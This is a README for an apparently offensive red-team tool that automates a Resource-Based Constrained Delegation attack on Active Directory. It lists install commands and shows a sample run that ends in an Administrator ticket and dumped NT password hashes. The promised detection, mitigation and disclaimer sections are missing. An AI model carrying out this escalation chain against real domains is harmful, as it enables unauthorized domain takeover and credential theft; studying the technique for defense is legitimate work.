# 🎭 RBCD_Exploit - Resource-Based Constrained Delegation Attack Automation

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-red.svg)](LICENSE)
[![Impacket](https://img.shields.io/badge/Impacket-0.13.0-green.svg)](https://github.com/fortra/impacket)
[![BloodyAD](https://img.shields.io/badge/BloodyAD-1.0-orange.svg)](https://github.com/CravateRouge/bloodyAD)

> **From GenericWrite to Domain Admin in minutes**

Automated exploitation of Resource-Based Constrained Delegation (RBCD) in Active Directory environments.

---

## 📋 Table of Contents

- [Overview](#overview)
- [How It Works](#how-it-works)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
- [Attack Flow](#attack-flow)
- [Example](#example)
- [Detection & Mitigation](#detection--mitigation)
- [Disclaimer](#disclaimer)

---

## 🎯 Overview

**RBCD_Exploit** automates the entire RBCD attack chain, transforming a simple `GenericWrite` permission into full administrative access on any target machine.

### What is RBCD?

Resource-Based Constrained Delegation allows a target machine to decide which other machines can impersonate users when connecting to it. If you have `GenericWrite` permissions on a machine, you can configure it to trust your fake computer — and then impersonate ANY user, including Domain Admin.

## 📦 Requirements

| Tool | Purpose |
|------|---------|
| **Python 3.8+** | Script execution |
| **impacket** | Kerberos operations, secretsdump |
| **bloodyAD** | LDAP/SAMR operations |
| **ldap3** | Python LDAP library |

### Network Requirements
- Reachable Domain Controller (port 389, 445, 88)
- Reachable target machine (port 445 for SMB)

---

## 🛠️ Installation

### 1. Clone the repository

```bash
git clone https://github.com/yourusername/rbcd-exploit.git
cd rbcd-exploit
```
### 2. Install dependencies
```
# Install impacket
pip3 install impacket ldap3
# Install bloodyAD
pip3 install bloodyAD
# Or via apt (Kali Linux)
sudo apt update
sudo apt install impacket-scripts bloodyad
```
### 3. Verify Installation
```
impacket-getTGT -h  # Should show help
bloodyAD --help     # Should show help
```

### 3. Execution
```
$ python3 rbcd_exploit.py
Domain: cs.org
DC IP: 192.168.56.102
Username: madelena.elfrieda
Password: sniper
Target computer: TARGET01
Fake computer name: FAKE01
Fake computer password: Pass123!

[*] Starting RBCD attack...
[+] GenericWrite confirmed
[+] Machine FAKE01$ ready
[+] RBCD configured
[+] TGT obtained
[+] Ticket obtained for Administrator
[+] Ticket saved: Administrator@cifs_TARGET01.cs.org@CS.ORG.ccache

==================================================
NT HASHES:
==================================================
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
testuser:1001:aad3b435b51404eeaad3b435b51404ee:3a3ea00cfc6d3a4d3a8a3f8a2c3d4e5f:::
secretadmin:1002:aad3b435b51404eeaad3b435b51404ee:f5a6b8c9d0e1f2a3b4c5d6e7f8a9b0c1:::

[+] RBCD attack completed!
```

📝 License
MIT License - See LICENSE file for details.

⭐ Star History
If this tool helped you, please give it a star! ⭐

Made with 🖤 for Red Teamers and Security Researchers

